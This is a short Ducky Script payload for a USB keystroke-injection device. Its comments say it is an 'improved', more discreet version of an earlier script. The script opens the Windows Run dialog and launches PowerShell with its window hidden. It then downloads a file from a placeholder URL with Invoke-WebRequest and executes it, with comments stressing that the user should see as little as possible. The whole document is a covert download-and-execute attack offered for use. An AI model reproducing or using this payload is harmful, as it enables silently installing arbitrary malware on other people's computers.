REM Edited by: Fahad Alkamli This is an improved version for the code above. In my opinion the user should see as minimum as possible so writing a whole line of code in the run is not discreet.

REM open the Run 
GUI r
REM Change this value depending on the computer you are using ( i mean slow or not ) 
DELAY 100
STRING powershell -windowstyle hidden
ENTER
REM the shell usually takes a few  seconds to fully run so i put a delay just in case .
DELAY 1000
REM I just wanted to note that the file can be an EXE or JAR file doesn't really matter.
REM in the destination if you put the fileName only, the file will be saved under C:\Users\LoggedInUser 
STRING $source = "File URL "; $destination = "Path\FileName"; Invoke-WebRequest $source -OutFile $destination; 
ENTER
DELAY 5000
STRING start-process FileName.EXE
ENTER
DELAY 100
STRING exit
ENTER
